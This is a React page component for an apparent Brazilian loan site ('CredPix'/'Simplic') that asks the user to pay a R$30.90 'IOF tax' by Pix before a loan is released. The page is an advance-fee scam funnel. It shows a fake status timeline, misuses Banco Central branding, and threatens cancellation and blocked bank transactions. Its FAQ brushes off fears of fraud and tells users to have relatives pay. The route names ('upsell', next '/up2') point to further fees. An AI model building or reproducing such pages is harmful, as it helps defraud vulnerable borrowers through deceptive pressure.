import { useState, useRef } from 'react'
import { useNavigate, useSearchParams } from 'react-router-dom'
import { motion } from 'framer-motion'

// ── Config ─────────────────────────────────────────────────────────────────────
const LOGO       = 'https://simuleoseucredito.com/emp/images/credpix-logo.png'
const VIDEO_URL  = 'https://brasilindoficialgv.com/video/iof.mp4'
const IOF_AMOUNT = 30.90
const EASE       = [0.22, 1, 0.36, 1]

function fmtBRL(v) {
  return 'R$ ' + Number(v).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
}

// ── Icons ──────────────────────────────────────────────────────────────────────

const IcoPix = () => (
  <svg width="18" height="18" viewBox="0 0 48 48">
    <path fill="#4db6ac" d="M11.9,12h-0.68l8.04-8.04c2.62-2.61,6.86-2.61,9.48,0L36.78,12H36.1c-1.6,0-3.11,0.62-4.24,1.76	l-6.8,6.77c-0.59,0.59-1.53,0.59-2.12,0l-6.8-6.77C15.01,12.62,13.5,12,11.9,12z"/>
    <path fill="#4db6ac" d="M36.1,36h0.68l-8.04,8.04c-2.62,2.61-6.86,2.61-9.48,0L11.22,36h0.68c1.6,0,3.11-0.62,4.24-1.76	l6.8-6.77c0.59-0.59,1.53-0.59,2.12,0l6.8,6.77C32.99,35.38,34.5,36,36.1,36z"/>
    <path fill="#4db6ac" d="M44.04,28.74L38.78,34H36.1c-1.07,0-2.07-0.42-2.83-1.17l-6.8-6.78c-1.36-1.36-3.58-1.36-4.94,0	l-6.8,6.78C13.97,33.58,12.97,34,11.9,34H9.22l-5.26-5.26c-2.61-2.62-2.61-6.86,0-9.48L9.22,14h2.68c1.07,0,2.07,0.42,2.83,1.17	l6.8,6.78c0.68,0.68,1.58,1.02,2.47,1.02s1.79-0.34,2.47-1.02l6.8-6.78C34.03,14.42,35.03,14,36.1,14h2.68l5.26,5.26	C46.65,21.88,46.65,26.12,44.04,28.74z"/>
  </svg>
)

const IcoWarningTriangle = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" className="flex-shrink-0">
    <path d="M12 2.5L1.5 21.5h21L12 2.5z" fill="#DC2626"/>
    <rect x="11" y="9.5" width="2" height="6" fill="white"/>
    <rect x="11" y="16.7" width="2" height="2" fill="white"/>
  </svg>
)

const IcoShieldCheck = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16A34A" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
    <polyline points="9 12 11 14 15 10"/>
  </svg>
)

const IcoBCB = () => (
  <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#1E3A5F" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
    <path d="M4 9V4h5" />
    <path d="M4 15v5h5" />
    <path d="M20 9V4h-5" />
    <path d="M20 15v5h-5" />
  </svg>
)

const IcoCheck = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
    <polyline points="20 6 9 17 4 12"/>
  </svg>
)

const IcoClock = ({ color = 'white' }) => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
  </svg>
)

const IcoChevron = ({ open }) => (
  <svg
    width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1E3A5F" strokeWidth="2.5"
    strokeLinecap="round" strokeLinejoin="round"
    className={`flex-shrink-0 transition-transform duration-200 ${open ? 'rotate-0' : 'rotate-180'}`}
  >
    <polyline points="18 15 12 9 6 15" />
  </svg>
)

// ── Status timeline ───────────────────────────────────────────────────────────

const STEPS = [
  { title: 'Simulação',              sub: 'Simulação realizada e cadastro concluído',        status: 'done'    },
  { title: 'Pagamento do Seguro',    sub: 'Pagamento concluído com sucesso',                  status: 'done'    },
  { title: 'Pagamento do Imposto IOF', sub: 'Aguardando pagamento para liberação do crédito', status: 'current' },
  { title: 'Crédito na conta',       sub: 'Crédito enviado para sua conta bancária',          status: 'pending' },
]

function TimelineStep({ title, sub, status, isLast }) {
  return (
    <div className="flex gap-3">
      <div className="flex flex-col items-center flex-shrink-0">
        <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
          status === 'done'    ? 'bg-green-500' :
          status === 'current' ? 'bg-[#2563EB]' :
                                  'bg-gray-200'
        }`}>
          {status === 'done'    && <IcoCheck />}
          {status === 'current' && <IcoClock />}
          {status === 'pending' && <IcoClock color="#9CA3AF" />}
        </div>
        {!isLast && <div className="w-0.5 flex-1 my-1 bg-gray-200" />}
      </div>
      <div className={isLast ? 'pb-1' : 'pb-6'}>
        <p className="font-bold text-[#1E3A5F] text-[15px]">{title}</p>
        <p className="text-gray-400 text-sm">{sub}</p>
      </div>
    </div>
  )
}

// ── FAQ ────────────────────────────────────────────────────────────────────────

const FAQS = [
  {
    q: 'Por que o imposto IOF não é descontado do empréstimo?',
    a: 'O valor do Imposto IOF é tratado separadamente pois ele é um imposto emitido pelo Banco Central assim que um empréstimo é aprovado, e é destinado aos cofres públicos, para garantir segurança para ambas as partes.',
  },
  {
    q: 'O que acontece após pagar o imposto?',
    a: 'Você será redirecionado automaticamente para a página onde confirmará e autorizará a transferência do dinheiro para sua conta.',
  },
  {
    q: 'Quanto tempo demora para liberar o crédito?',
    a: 'Como o pagamento é feito via Pix, a liberação do empréstimo é imediata. Todo o processo, incluindo a transferência do crédito, leva cerca de 5-10 minutos.',
  },
  {
    q: 'Tô com medo de cair em golpe',
    a: 'A Simplic atua há mais de 14 anos com empréstimos online, contando com milhares de clientes satisfeitos. Nosso site é seguro e confiável. Não solicitamos sua senha ou dados bancários.',
  },
  {
    q: 'Posso pagar o imposto com cartão de crédito?',
    a: 'Não, o imposto IOF só pode ser pago via Pix. Se você não tem uma conta em um banco que oferece Pix, peça a um amigo ou familiar para fazer o pagamento para você.',
  },
  {
    q: 'O que acontece se eu não pagar o imposto?',
    a: 'Se você não pagar o imposto, seu pedido de empréstimo será cancelado, mas lembre-se de que o imposto IOF é obrigatório pelo Banco Central, para garantir a segurança e processamento do seu pedido.',
  },
]

function FaqItem({ q, a, isOpen, onToggle }) {
  return (
    <div className="border-b border-gray-100 last:border-0">
      <button onClick={onToggle} className="w-full flex items-center justify-between gap-3 py-4 text-left">
        <span className="font-bold text-[#1E3A5F] text-[15px]">{q}</span>
        <IcoChevron open={isOpen} />
      </button>
      {isOpen && <p className="text-gray-500 text-sm leading-relaxed pb-4 pr-6">{a}</p>}
    </div>
  )
}

// ── Video ──────────────────────────────────────────────────────────────────────

function IofVideo() {
  const ref = useRef(null)
  const [muted, setMuted] = useState(true)

  function unmute() {
    if (!ref.current) return
    ref.current.muted = false
    setMuted(false)
    ref.current.play()
  }

  return (
    <div className="relative rounded-xl overflow-hidden bg-black cursor-pointer" onClick={unmute}>
      <video
        ref={ref}
        src={VIDEO_URL}
        autoPlay
        loop
        muted
        playsInline
        className="w-full h-auto block"
      />
      {muted && (
        <div className="absolute inset-0 flex items-center justify-center bg-black/20">
          <span className="bg-black/70 text-white text-sm font-semibold px-4 py-2 rounded-full">
            Clique para ativar o som
          </span>
        </div>
      )}
    </div>
  )
}

// ── Main component ─────────────────────────────────────────────────────────────

export default function UpsellOne() {
  const [searchParams] = useSearchParams()
  const navigate = useNavigate()
  const loanAmount = Number(searchParams.get('valor')) || 5000
  const [openFaq, setOpenFaq] = useState(null)

  function goPay() {
    const params = new URLSearchParams(window.location.search)
    params.set('fee', String(IOF_AMOUNT))
    params.set('produto', 'Imposto IOF')
    params.set('next', '/up2')
    navigate(`/pagamento-upsell?${params.toString()}`)
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-[#1F3D20] py-4 flex items-center justify-center">
        <img src={LOGO} alt="CredPix" className="h-8 object-contain" />
      </div>

      <div className="max-w-xl mx-auto px-5 py-6">

        {/* Progress bar */}
        <div className="mb-6">
          <div className="flex justify-between text-sm mb-2">
            <span className="text-gray-500 font-medium">Etapa Final</span>
            <span className="font-bold text-[#2563EB]">94%</span>
          </div>
          <div className="h-2.5 bg-gray-200 rounded-full overflow-hidden">
            <motion.div
              className="h-full bg-[#2563EB] rounded-full"
              initial={{ width: 0 }}
              animate={{ width: '94%' }}
              transition={{ duration: 0.8, ease: EASE }}
            />
          </div>
        </div>

        {/* Main card */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 mb-5">
          <h1 className="text-2xl font-extrabold text-[#1E3A5F] text-center leading-snug mb-4">
            Parabéns, falta pouco para você receber o valor do empréstimo na sua conta!
          </h1>
          <p className="text-gray-500 text-center leading-relaxed mb-5">
            Você está a um passo de receber seu empréstimo, efetue o pagamento do imposto IOF
            (Imposto sobre Operações Financeiras) emitido pelo Banco Central para autorizar o
            saque imediatamente para sua conta.
          </p>

          <div className="bg-red-50 border-l-4 border-red-500 rounded-r-lg px-4 py-3.5 flex gap-3 mb-5">
            <IcoWarningTriangle />
            <div>
              <p className="font-bold text-red-600 text-sm mb-0.5">AVISO</p>
              <p className="text-red-600 text-sm leading-relaxed">
                O não pagamento do IOF resultará no cancelamento do empréstimo e no bloqueio de
                futuras transações bancárias.
              </p>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-100 rounded-xl p-4">
            <p className="font-bold text-[#1E3A5F] mb-1">O que é IOF?</p>
            <p className="text-gray-400 text-sm mb-3">Aumente o volume 🔊</p>
            <IofVideo />
          </div>
        </div>

        {/* Status timeline */}
        <div className="bg-white rounded-2xl border border-gray-100 p-6 mb-5">
          <p className="font-bold text-[#1E3A5F] mb-5">Status do seu empréstimo</p>
          {STEPS.map((s, i) => (
            <TimelineStep key={s.title} {...s} isLast={i === STEPS.length - 1} />
          ))}
        </div>

        {/* Banco Central */}
        <div className="text-center mb-6">
          <div className="flex items-center justify-center gap-2 mb-2">
            <IcoBCB />
            <span className="font-extrabold text-[#1E3A5F] text-sm leading-tight text-left">
              BANCO CENTRAL<br />DO BRASIL
            </span>
          </div>
          <p className="text-gray-500 text-sm leading-relaxed max-w-md mx-auto">
            O não pagamento do imposto resulta no cancelamento do contrato do empréstimo,
            impossibilitando uma nova contratação por um prazo máximo de 90 dias
          </p>
        </div>

        {/* Loan amount */}
        <div className="bg-green-50 border border-green-200 rounded-xl py-5 text-center mb-4">
          <p className="text-green-700 font-semibold text-sm mb-1">Valor do empréstimo</p>
          <p className="text-green-700 font-extrabold text-3xl">{fmtBRL(loanAmount)}</p>
        </div>

        {/* Pix box */}
        <div className="bg-blue-50 border border-blue-200 rounded-xl py-5 text-center mb-5">
          <p className="text-[#1E3A5F] font-bold flex items-center justify-center gap-1.5 mb-1">
            Pague via Pix <IcoPix />
          </p>
          <p className="text-gray-500 text-sm mb-1">O pagamento será confirmado imediatamente</p>
          <p className="text-[#2563EB] font-extrabold text-3xl">{fmtBRL(IOF_AMOUNT)}</p>
        </div>

        <button
          onClick={goPay}
          className="w-full bg-[#1E3A5F] hover:bg-[#172e4d] text-white py-4 rounded-full font-bold text-base mb-4 transition-colors"
        >
          Pagar agora
        </button>

        <div className="flex items-center justify-center gap-2 text-sm text-gray-500 mb-8">
          <IcoShieldCheck /> Ambiente Seguro
        </div>

        {/* FAQ */}
        <div className="bg-white rounded-2xl border border-gray-100 p-6 mb-8">
          <p className="font-bold text-[#1E3A5F] text-lg mb-2">Dúvidas Frequentes</p>
          {FAQS.map((f, i) => (
            <FaqItem
              key={f.q}
              q={f.q}
              a={f.a}
              isOpen={openFaq === i}
              onToggle={() => setOpenFaq(openFaq === i ? null : i)}
            />
          ))}
        </div>
      </div>

      {/* Footer */}
      <div className="bg-[#1F3D20] py-8 text-center">
        <img src={LOGO} alt="CredPix" className="h-8 object-contain mx-auto mb-3" />
        <p className="text-white/80 text-sm">Simplic © 2025 Instituição Financeira</p>
        <p className="text-white/60 text-xs mt-0.5">CNPJ: 33.030.944/0001-60</p>
      </div>
    </div>
  )
}
